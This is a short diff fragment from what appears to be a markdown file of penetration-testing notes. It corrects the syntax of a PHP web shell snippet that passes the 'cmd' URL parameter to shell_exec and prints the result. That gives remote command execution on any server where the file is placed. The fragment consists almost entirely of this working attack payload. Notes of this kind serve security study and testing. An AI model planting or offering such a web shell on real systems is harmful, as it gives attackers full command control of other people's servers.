@@ -127,7 +127,7 @@ db.<dbname>.find() ---> to list out the documents
 #### 1
 ```php
 <?php
-$output = shell_exec($_GET(["cmd"]);
+$output = shell_exec($_GET["cmd"]);
 echo "<pre>$output</pre>";
 ?>
 ```
